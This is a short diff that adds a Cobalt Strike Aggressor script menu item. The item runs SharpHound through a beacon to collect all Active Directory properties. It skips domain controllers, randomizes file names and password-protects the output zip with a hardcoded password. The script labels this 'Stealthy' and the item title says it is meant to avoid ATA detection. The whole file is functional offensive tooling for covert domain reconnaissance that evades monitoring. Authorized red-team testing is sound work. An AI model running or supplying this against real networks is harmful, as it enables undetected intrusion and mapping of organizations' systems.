@@ -1,0 +1,14 @@
+item "SharpHound All, Skip DC's and avoid ATA"{
+local('$bid');
+foreach $bid ($1){
+sharphoundallavoiddomaincontrollers($bid);
+		}
+	} #End Item 
+
+
+
+sub sharphoundallavoiddomaincontrollers{
+$bid = $1;
+bexecute_assembly($1, script_resource('/exe/SharpHound.exe'), "--CollectionMethod All --CollectAllProperties --nosavecache --EncryptZip Bl00DhounD0gg1234 --ExcludeDomainControllers --RandomizeFileNames");
+btask($bid, 'Stealthy Collection of All Properties with zip password of Bl00DhounD0gg1234 and avoiding Domain Controllers');
+}
